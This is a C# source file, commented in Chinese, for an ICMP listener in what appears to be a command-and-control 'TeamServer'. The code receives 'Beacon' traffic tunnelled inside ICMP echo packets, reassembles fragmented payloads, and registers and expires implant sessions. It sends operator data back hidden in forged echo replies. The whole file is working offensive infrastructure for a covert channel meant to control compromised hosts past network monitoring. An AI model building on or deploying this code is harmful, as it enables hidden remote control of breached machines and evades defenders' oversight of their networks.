using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using DataList.Beacon.Models;
using TeamServer.Beacon.Interface;
using TeamServer.Beacon.Models;
using TeamServer.HandlePacket;
using TeamServer.Data;
using System.Runtime.InteropServices;
using DataList.Client.Models;

namespace TeamServer.Listener
{
    /// <summary>
    /// 分片信息
    /// </summary>
    internal class FragmentInfo
    {
        public ConcurrentDictionary<int, byte[]> Fragments { get; set; } = new();
        public int TotalFragments { get; set; }
        public DateTime LastUpdate { get; set; } = DateTime.UtcNow;
        
        public bool IsComplete => Fragments.Count == TotalFragments;
        
        public byte[] Reassemble()
        {
            if (!IsComplete) return null;
            
            var totalSize = Fragments.Values.Sum(f => f.Length);
            var result = new byte[totalSize];
            var offset = 0;
            
            for (int i = 0; i < TotalFragments; i++)
            {
                if (Fragments.TryGetValue(i, out var fragment))
                {
                    Buffer.BlockCopy(fragment, 0, result, offset, fragment.Length);
                    offset += fragment.Length;
                }
            }
            
            return result;
        }
    }

    /// <summary>
    /// ICMP监听器实现
    /// 注意：在Windows上需要以管理员权限运行才能接收ICMP数据包
    /// </summary>
    internal class ICMPListener : IListener
    {
        private readonly string _bindAddress;
        private readonly int _port;
        private CancellationTokenSource? _cts;
        private Task? _receiveTask;
        private Task? _cleanupTask;
        private readonly TimeSpan _cleanupInterval = TimeSpan.FromSeconds(30);
        private readonly TimeSpan _beaconIdleTimeout = TimeSpan.FromSeconds(60);
        private Socket? _icmpSocket;

        // ICMP会话管理
        private readonly ConcurrentDictionary<string, BeaconICMPSession> _sessions = new();
        
        // 存储每个Beacon的累积数据
        private readonly ConcurrentDictionary<string, byte[]> _accumulators = new();
        
        // 存储分片数据
        private readonly ConcurrentDictionary<string, ConcurrentDictionary<ushort, FragmentInfo>> _fragments = new();

        public ICMPListener(string bindAddress, int port)
        {
            _bindAddress = bindAddress;
            _port = port;
        }

        public bool IsRunning { get; private set; }
        public string Protocol => "ICMP";
        public string BindAddress => _bindAddress;
        public int Port => _port;

        /// <summary>
        /// 新Beacon连接事件
        /// </summary>
        public event Action<IBeaconSession> OnBeaconConnected;

        /// <summary>
        /// Beacon断开连接事件
        /// </summary>
        public event Action<IBeaconSession> OnBeaconDisconnected;

        /// <summary>
        /// ICMP模式不处理Client，这里声明但不触发
        /// </summary>
        public event Action<ClientSession> OnClientConnected;
        public event Action<ClientSession> OnClientDisconnected;

        /// <summary>
        /// 错误事件
        /// </summary>
        public event Action<Exception> OnError;

        public async Task StartAsync()
        {
            if (IsRunning)
                return;

            try
            {
                Console.WriteLine($"[ICMP] 创建原始套接字，协议类型: {ProtocolType.Icmp}");
                // 创建原始套接字来监听ICMP数据包
                // 注意：这需要管理员权限
                _icmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
                Console.WriteLine($"[ICMP] 套接字创建成功");
                
                Console.WriteLine($"[ICMP] 绑定到地址: {IPAddress.Parse(_bindAddress)}:0");
                _icmpSocket.Bind(new IPEndPoint(IPAddress.Parse(_bindAddress), 0));
                Console.WriteLine($"[ICMP] 套接字绑定成功");
                
                _cts = new CancellationTokenSource();
                IsRunning = true;

                // 启动接收任务
                _receiveTask = Task.Run(() => ReceiveLoop(_cts.Token));
                
                // 启动清理任务
                _cleanupTask = Task.Run(() => CleanupLoopAsync(_cts.Token));
                
                Console.WriteLine($"[ICMP] 监听器已启动，绑定地址: {_bindAddress}");
                
                await Task.CompletedTask;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ICMP] 监听器启动失败: {ex.Message}");
                Console.WriteLine($"[ICMP] 异常详细信息: {ex.StackTrace}");
                OnError?.Invoke(ex);
                throw;
            }
        }

        public async Task StopAsync()
        {
            if (!IsRunning)
                return;

            try
            {
                IsRunning = false;
                _cts?.Cancel();
                
                try 
                { 
                    _icmpSocket?.Close();
                    if (_receiveTask != null) 
                        await _receiveTask.ConfigureAwait(false); 
                } 
                catch { }
                
                try 
                { 
                    if (_cleanupTask != null) 
                        await _cleanupTask.ConfigureAwait(false); 
                } 
                catch { }
                
                Console.WriteLine($"[ICMP] 监听器已停止");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ICMP] 监听器停止失败: {ex.Message}");
                OnError?.Invoke(ex);
                throw;
            }
        }

        private async Task ReceiveLoop(CancellationToken cancellationToken)
        {
            if (_icmpSocket == null) 
            {
                Console.WriteLine($"[ICMP] 套接字为空，无法接收数据");
                return;
            }
            
            var buffer = new byte[4096];
            Console.WriteLine($"[ICMP] 开始接收数据包循环");
            
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    Console.WriteLine($"[ICMP] 等待接收数据包...");
                    // 接收ICMP数据包
                    EndPoint remoteEndPoint = new IPEndPoint(IPAddress.Any, 0);
                    var received = await Task.Run(() => _icmpSocket.ReceiveFrom(buffer, ref remoteEndPoint), cancellationToken);
                    
                    if (received > 0 && remoteEndPoint is IPEndPoint remoteIp)
                    {
                        // 处理ICMP Echo请求/回复数据包
                        ProcessICMPPacket(remoteIp.Address.ToString(), buffer, received);
                    }
                }
                catch (OperationCanceledException)
                {
                    Console.WriteLine($"[ICMP] 接收循环被取消");
                    break;
                }
                catch (ObjectDisposedException)
                {
                    Console.WriteLine($"[ICMP] 套接字已关闭");
                    break;
                }
                catch (Exception ex)
                {
                    if (!cancellationToken.IsCancellationRequested)
                    {
                        Console.WriteLine($"[ICMP] 接收数据包异常: {ex.Message}");
                        Console.WriteLine($"[ICMP] 异常详细信息: {ex.StackTrace}");
                        OnError?.Invoke(ex);
                    }
                }
            }
        }

        private void ProcessICMPPacket(string remoteAddress, byte[] buffer, int length)
        {
            try
            {
                Console.WriteLine($"[ICMP] 开始处理数据包，来源: {remoteAddress}，长度: {length}");
                
                // 在Windows上，原始套接字接收的数据包包含IP头部
                // IP头部通常是20字节，但可能有选项，所以需要动态解析
                if (length < 20) 
                {
                    Console.WriteLine($"[ICMP] 数据包太短，长度: {length}");
                    return;
                }

                // 解析IP头部长度 (IHL字段在第一个字节的低4位)
                int ipHeaderLength = (buffer[0] & 0x0F) * 4;
                Console.WriteLine($"[ICMP] IP头部长度: {ipHeaderLength}");
                
                if (length < ipHeaderLength + 8) 
                {
                    Console.WriteLine($"[ICMP] 数据包长度不足以包含ICMP头部");
                    return;
                }

                // ICMP头部从IP头部之后开始
                int icmpOffset = ipHeaderLength;
                byte type = buffer[icmpOffset];
                byte code = buffer[icmpOffset + 1];
                ushort id = BitConverter.ToUInt16(buffer, icmpOffset + 4);
                ushort sequence = BitConverter.ToUInt16(buffer, icmpOffset + 6);

                Console.WriteLine($"[ICMP] ICMP头部信息 - Type: {type}, Code: {code}, ID: {id}, Sequence: {sequence}");

                // 我们只处理Echo请求(8)和Echo回复(0)
                if (type != 8 && type != 0) 
                {
                    Console.WriteLine($"[ICMP] 不支持的ICMP类型: {type}");
                    return;
                }

                // ICMP数据部分从ICMP头部后8字节开始
                int dataOffset = icmpOffset + 8;
                if (length <= dataOffset) 
                {
                    Console.WriteLine($"[ICMP] 数据包没有有效载荷");
                    return;
                }
                
                int dataLength = length - dataOffset;
                var data = new byte[dataLength];
                Buffer.BlockCopy(buffer, dataOffset, data, 0, dataLength);
                
                Console.WriteLine($"[ICMP] 提取有效载荷，长度: {data.Length} 字节");
                
                // 检查是否为分片数据 (通过载荷开头的"FRAG"标识)
                if (data.Length >= 12 && 
                    data[0] == 0x46 && data[1] == 0x52 && 
                    data[2] == 0x41 && data[3] == 0x47)
                {
                    Console.WriteLine($"[ICMP] 检测到分片数据");
                    ProcessFragmentedData(remoteAddress, data);
                }
                else
                {
                    // 处理普通数据
                    ProcessIncoming(remoteAddress, data);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ICMP ERROR] 解析ICMP数据包异常: {ex.Message}");
                Console.WriteLine($"[ICMP ERROR] 异常详细信息: {ex.StackTrace}");
            }
        }

        /// <summary>
        /// 处理分片数据
        /// </summary>
        /// <param name="remoteAddress">远程地址</param>
        /// <param name="data">分片数据</param>
        private void ProcessFragmentedData(string remoteAddress, byte[] data)
        {
            try
            {
                if (data.Length < 12)
                {
                    Console.WriteLine($"[ICMP] 分片头部数据不足");
                    return;
                }
                
                // 跳过"FRAG"标识，解析分片头部
                var fragmentId = (ushort)((data[4] << 8) | data[5]);
                var fragmentIndex = (data[6] << 8) | data[7];
                var totalFragments = (data[8] << 8) | data[9];
                var fragmentSize = (data[10] << 8) | data[11];
                
                Console.WriteLine($"[ICMP] 分片信息 - ID: {fragmentId}, 索引: {fragmentIndex}/{totalFragments}, 大小: {fragmentSize}");
                
                // 提取分片数据
                var fragmentData = new byte[fragmentSize];
                Buffer.BlockCopy(data, 12, fragmentData, 0, fragmentSize);
                
                // 获取或创建分片集合
                var fragmentKey = $"{remoteAddress}_{fragmentId}";
                var fragmentCollection = _fragments.GetOrAdd(fragmentKey, _ => new ConcurrentDictionary<ushort, FragmentInfo>());
                var fragmentInfo = fragmentCollection.GetOrAdd(fragmentId, _ => new FragmentInfo { TotalFragments = totalFragments });
                
                // 添加分片
                fragmentInfo.Fragments.TryAdd(fragmentIndex, fragmentData);
                fragmentInfo.LastUpdate = DateTime.UtcNow;
                
                Console.WriteLine($"[ICMP] 分片已收集，当前进度: {fragmentInfo.Fragments.Count}/{totalFragments}");
                
                // 检查是否收集完整
                if (fragmentInfo.IsComplete)
                {
                    Console.WriteLine($"[ICMP] 分片收集完成，开始重组");
                    var reassembledData = fragmentInfo.Reassemble();
                    
                    // 清理分片信息
                    fragmentCollection.TryRemove(fragmentId, out _);
                    if (fragmentCollection.Count == 0)
                    {
                        _fragments.TryRemove(fragmentKey, out _);
                    }
                    
                    // 处理重组后的数据
                    ProcessIncoming(remoteAddress, reassembledData);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ICMP ERROR] 处理分片数据异常: {ex.Message}");
            }
        }

        /// <summary>
        /// 处理ICMP数据包中的有效载荷
        /// </summary>
        /// <param name="remoteAddress">远程地址</param>
        /// <param name="data">数据</param>
        public void ProcessIncoming(string remoteAddress, byte[] data)
        {
            try
            {
                Console.WriteLine($"[ICMP] 处理有效载荷数据，来源: {remoteAddress}，长度: {data.Length}");
                
                if (data == null || data.Length == 0)
                {
                    Console.WriteLine($"[ICMP] 有效载荷数据为空");
                    return;
                }

                // 获取或创建会话
                var session = _sessions.GetOrAdd(remoteAddress, _ => CreateOrGetSession(remoteAddress));
                session.Info.LastSeenTime = DateTime.UtcNow;
                
                Console.WriteLine($"[ICMP] 会话已获取/创建，会话ID: {session.Info.Id}");

                // 处理累积数据
                var acc = _accumulators.GetOrAdd(remoteAddress, _ => Array.Empty<byte>());
                
                // 追加数据
                if (acc.Length == 0)
                {
                    acc = new byte[data.Length];
                    Buffer.BlockCopy(data, 0, acc, 0, data.Length);
                }
                else
                {
                    var combined = new byte[acc.Length + data.Length];
                    Buffer.BlockCopy(acc, 0, combined, 0, acc.Length);
                    Buffer.BlockCopy(data, 0, combined, acc.Length, data.Length);
                    acc = combined;
                }

                Console.WriteLine($"[ICMP] 数据已追加到累积缓冲区，当前长度: {acc.Length}");

                // 处理帧: [4-byte len BE] + payload
                int offset = 0;
                while (true)
                {
                    if (acc.Length - offset < 4) 
                    {
                        Console.WriteLine($"[ICMP] 累积缓冲区不足4字节，等待更多数据");
                        break;
                    }
                    
                    int frameLen = (acc[offset] << 24) | (acc[offset + 1] << 16) | (acc[offset + 2] << 8) | acc[offset + 3];
                    
                    Console.WriteLine($"[ICMP] 解析帧长度: {frameLen}");
                    
                    if (frameLen <= 0 || frameLen > 16 * 1024 * 1024)
                    {
                        Console.WriteLine($"[ICMP ERROR] 非法帧长度: {frameLen}, 丢弃累积");
                        acc = Array.Empty<byte>();
                        break;
                    }
                    
                    if (acc.Length - offset - 4 < frameLen) 
                    {
                        Console.WriteLine($"[ICMP] 帧数据不完整，等待更多数据");
                        break;
                    }

                    var frame = new byte[frameLen];
                    Buffer.BlockCopy(acc, offset + 4, frame, 0, frameLen);
                    
                    Console.WriteLine($"[ICMP] 提取完整帧，长度: {frame.Length}");
                    
                    try 
                    { 
                        // 处理数据包
                        Console.WriteLine($"[ICMP] 转发帧数据给BeaconPacketHandle处理");
                        BeaconPacketHandle.Read(frame, session); 
                    }
                    catch (Exception ex) 
                    { 
                        Console.WriteLine($"[ICMP ERROR] 解码帧异常: {ex.Message}"); 
                        Console.WriteLine($"[ICMP ERROR] 异常详细信息: {ex.StackTrace}");
                    }
                    
                    offset += 4 + frameLen;
                }

                // 保存剩余数据
                if (offset == 0)
                {
                    _accumulators[remoteAddress] = acc;
                    Console.WriteLine($"[ICMP] 无帧被处理，保留累积数据");
                }
                else if (offset >= acc.Length)
                {
                    _accumulators[remoteAddress] = Array.Empty<byte>();
                    Console.WriteLine($"[ICMP] 所有数据已处理完毕");
                }
                else
                {
                    var remaining = acc.Length - offset;
                    var tail = new byte[remaining];
                    Buffer.BlockCopy(acc, offset, tail, 0, remaining);
                    _accumulators[remoteAddress] = tail;
                    Console.WriteLine($"[ICMP] 保留剩余数据，长度: {remaining}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ICMP ERROR] 处理ICMP数据包异常: {ex.Message}");
                Console.WriteLine($"[ICMP ERROR] 异常详细信息: {ex.StackTrace}");
            }
        }

        private BeaconICMPSession CreateOrGetSession(string remoteAddress)
        {
            Console.WriteLine($"[ICMP] 创建或获取会话，地址: {remoteAddress}");
            
            var info = new BeaconInfo
            {
                Id = Guid.NewGuid().ToString("N"),
                ListenerId = Protocol,
                IPProt = $"{remoteAddress}:{_port}",
                IPAddress = remoteAddress,
                ConnectedTime = DateTime.UtcNow,
                LastSeenTime = DateTime.UtcNow,
            };
            
            var session = new BeaconICMPSession(
                async (data) => 
                {
                    // 发送数据到指定的远程地址
                    await SendICMPData(remoteAddress, data).ConfigureAwait(false);
                },
                () => 
                { 
                    _sessions.TryRemove(remoteAddress, out _);
                    _accumulators.TryRemove(remoteAddress, out _);
                },
                info);

            session.OnClosed += s =>
            {
                _sessions.TryRemove(remoteAddress, out _);
                _accumulators.TryRemove(remoteAddress, out _);
                OnBeaconDisconnected?.Invoke(s);
                Console.WriteLine($"[ICMP] 会话已关闭: {remoteAddress}");
            };

            OnBeaconConnected?.Invoke(session);
            Console.WriteLine($"[+] ICMP Beacon会话已创建: {remoteAddress}");
            return session;
        }

        /// <summary>
        /// 发送ICMP数据到指定地址
        /// </summary>
        /// <param name="address">目标地址</param>
        /// <param name="data">要发送的数据</param>
        private async Task SendICMPData(string address, byte[] data)
        {
            try
            {
                Console.WriteLine($"[ICMP] 发送数据到 {address}，长度: {data.Length}");
                
                // ICMP数据包大小限制
                const int maxIcmpDataSize = 1400;
                
                if (data.Length <= maxIcmpDataSize)
                {
                    // 小数据包，直接发送
                    await SendSingleICMPPacket(address, data);
                }
                else
                {
                    // 大数据包，需要分片发送
                    Console.WriteLine($"[ICMP] 服务器端数据包过大，需要分片发送");
                    await SendFragmentedICMPPacket(address, data, maxIcmpDataSize);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] 发送ICMP数据异常: {ex.Message}");
                Console.WriteLine($"[!] 异常详细信息: {ex.StackTrace}");
            }
        }
        
        private async Task SendSingleICMPPacket(string address, byte[] data)
        {
            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp))
            {
                // 构造ICMP Echo回复包
                var icmpPacket = new byte[8 + data.Length];
                
                // ICMP头部
                icmpPacket[0] = 0;  // Type: Echo Reply
                icmpPacket[1] = 0;  // Code: 0
                icmpPacket[2] = 0;  // Checksum (先设为0)
                icmpPacket[3] = 0;
                icmpPacket[4] = 0;  // ID
                icmpPacket[5] = 0;
                icmpPacket[6] = 0;  // Sequence
                icmpPacket[7] = 0;
                
                // 复制数据
                if (data.Length > 0)
                {
                    Buffer.BlockCopy(data, 0, icmpPacket, 8, data.Length);
                }
                
                // 计算校验和
                var checksum = CalculateChecksum(icmpPacket);
                icmpPacket[2] = (byte)(checksum >> 8);
                icmpPacket[3] = (byte)(checksum & 0xFF);
                
                // 发送到目标地址
                var targetEndPoint = new IPEndPoint(IPAddress.Parse(address), 0);
                await Task.Run(() => socket.SendTo(icmpPacket, targetEndPoint));
                
                Console.WriteLine($"[ICMP] 数据发送成功");
            }
        }
        
        private async Task SendFragmentedICMPPacket(string address, byte[] data, int maxFragmentSize)
        {
            var totalFragments = (int)Math.Ceiling((double)data.Length / maxFragmentSize);
            var fragmentId = (ushort)new Random().Next(1, 65535);
            
            Console.WriteLine($"[ICMP] 服务器分片发送，总片数: {totalFragments}，分片ID: {fragmentId}");
            
            for (int i = 0; i < totalFragments; i++)
            {
                var offset = i * maxFragmentSize;
                var fragmentSize = Math.Min(maxFragmentSize, data.Length - offset);
                
                // 分片标识 + 分片头部：[FRAG:4][FragmentID:2][FragmentIndex:2][TotalFragments:2][FragmentSize:2] + 数据
                var fragmentHeader = new byte[12];
                // 分片标识 "FRAG"
                fragmentHeader[0] = 0x46; // 'F'
                fragmentHeader[1] = 0x52; // 'R'
                fragmentHeader[2] = 0x41; // 'A'
                fragmentHeader[3] = 0x47; // 'G'
                // 分片信息
                fragmentHeader[4] = (byte)(fragmentId >> 8);
                fragmentHeader[5] = (byte)(fragmentId & 0xFF);
                fragmentHeader[6] = (byte)(i >> 8);
                fragmentHeader[7] = (byte)(i & 0xFF);
                fragmentHeader[8] = (byte)(totalFragments >> 8);
                fragmentHeader[9] = (byte)(totalFragments & 0xFF);
                fragmentHeader[10] = (byte)(fragmentSize >> 8);
                fragmentHeader[11] = (byte)(fragmentSize & 0xFF);
                
                var fragmentData = new byte[12 + fragmentSize];
                Buffer.BlockCopy(fragmentHeader, 0, fragmentData, 0, 12);
                Buffer.BlockCopy(data, offset, fragmentData, 12, fragmentSize);
                
                // 发送分片
                using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp))
                {
                    var icmpPacket = new byte[8 + fragmentData.Length];
                    
                    // ICMP头部 - 使用普通的Echo Reply
                    icmpPacket[0] = 0;  // Type: Echo Reply
                    icmpPacket[1] = 0;  // Code: 0 (普通数据，分片通过载荷标识识别)
                    icmpPacket[2] = 0;  // Checksum
                    icmpPacket[3] = 0;
                    icmpPacket[4] = 0;  // ID
                    icmpPacket[5] = 0;
                    icmpPacket[6] = 0;  // Sequence
                    icmpPacket[7] = 0;
                    
                    Buffer.BlockCopy(fragmentData, 0, icmpPacket, 8, fragmentData.Length);
                    
                    var checksum = CalculateChecksum(icmpPacket);
                    icmpPacket[2] = (byte)(checksum >> 8);
                    icmpPacket[3] = (byte)(checksum & 0xFF);
                    
                    var targetEndPoint = new IPEndPoint(IPAddress.Parse(address), 0);
                    await Task.Run(() => socket.SendTo(icmpPacket, targetEndPoint));
                    
                    Console.WriteLine($"[ICMP] 服务器分片 {i + 1}/{totalFragments} 发送成功，大小: {fragmentSize}");
                }
                
                // 分片间稍微延迟
                await Task.Delay(10);
            }
        }
        
        /// <summary>
        /// 计算ICMP校验和
        /// </summary>
        /// <param name="data">ICMP数据包</param>
        /// <returns>校验和</returns>
        private ushort CalculateChecksum(byte[] data)
        {
            uint sum = 0;
            
            // 按16位字计算校验和
            for (int i = 0; i < data.Length - 1; i += 2)
            {
                sum += (uint)((data[i] << 8) + data[i + 1]);
            }
            
            // 如果长度为奇数，添加最后一个字节
            if (data.Length % 2 == 1)
            {
                sum += (uint)(data[data.Length - 1] << 8);
            }
            
            // 处理进位
            while ((sum >> 16) != 0)
            {
                sum = (sum & 0xFFFF) + (sum >> 16);
            }
            
            // 取反
            return (ushort)(~sum);
        }

        private async Task CleanupLoopAsync(CancellationToken cancellationToken)
        {
            Console.WriteLine($"[ICMP] 启动清理循环");
            
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    CleanupStaleBeacons();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[ICMP] 清理Beacon异常: {ex.Message}");
                    OnError?.Invoke(ex);
                }

                try 
                { 
                    await Task.Delay(_cleanupInterval, cancellationToken).ConfigureAwait(false); 
                }
                catch (OperationCanceledException) 
                { 
                    Console.WriteLine($"[ICMP] 清理循环被取消");
                    break; 
                }
            }
        }

        private void CleanupStaleBeacons()
        {
            var now = DateTime.UtcNow;
            
            // 清理过期的分片数据
            CleanupStaleFragments(now);
            
            // 快照全局列表，避免枚举修改
            IBeaconSession[] snapshot;
            lock (BeaconList.Beacons)
            {
                snapshot = BeaconList.Beacons.ToArray();
            }

            foreach (var beacon in snapshot)
            {
                // 仅清理ICMP会话
                if (!string.Equals(beacon.Info.ListenerId, this.Protocol, StringComparison.OrdinalIgnoreCase))
                {
                    continue;
                }

                var id = beacon.Info.Id;
                var lastSeen = beacon.Info.LastSeenTime;
                var missingInActiveMap = !_sessions.ContainsKey(beacon.Info.IPAddress); // 基于IP地址键
                var timedOut = (now - lastSeen) > _beaconIdleTimeout;

                if (missingInActiveMap || timedOut)
                {
                    // 从全局列表移除
                    lock (BeaconList.Beacons)
                    {
                        BeaconList.Beacons.RemoveAll(b => b.Info.Id == id);
                    }
                    
                    // 发送断开通知
                    try 
                    { 
                        BeaconPacketHandle.SendBeaconDisconnectedNotification(beacon); 
                    } 
                    catch { }
                    
                    // 移除本地会话映射
                    _sessions.TryRemove(beacon.Info.IPAddress, out _);
                    _accumulators.TryRemove(beacon.Info.IPAddress, out _);
                    
                    OnBeaconDisconnected?.Invoke(beacon);
                    Console.WriteLine($"[-] [ICMP] 清理Beacon: {beacon.Info.IPProt}, missing={missingInActiveMap}, timeout={timedOut}");
                }
            }
        }
        
        private void CleanupStaleFragments(DateTime now)
        {
            var staleKeys = new List<string>();
            
            foreach (var kvp in _fragments)
            {
                var fragmentKey = kvp.Key;
                var fragmentCollection = kvp.Value;
                var staleFragmentIds = new List<ushort>();
                
                foreach (var fragmentKvp in fragmentCollection)
                {
                    var fragmentId = fragmentKvp.Key;
                    var fragmentInfo = fragmentKvp.Value;
                    
                    // 清理超过30秒的未完成分片
                    if ((now - fragmentInfo.LastUpdate).TotalSeconds > 30)
                    {
                        staleFragmentIds.Add(fragmentId);
                    }
                }
                
                // 移除过期分片
                foreach (var fragmentId in staleFragmentIds)
                {
                    fragmentCollection.TryRemove(fragmentId, out _);
                    Console.WriteLine($"[ICMP] 清理过期分片: {fragmentKey}_{fragmentId}");
                }
                
                // 如果集合为空，标记为待删除
                if (fragmentCollection.Count == 0)
                {
                    staleKeys.Add(fragmentKey);
                }
            }
            
            // 移除空的分片集合
            foreach (var key in staleKeys)
            {
                _fragments.TryRemove(key, out _);
            }
        }
    }
}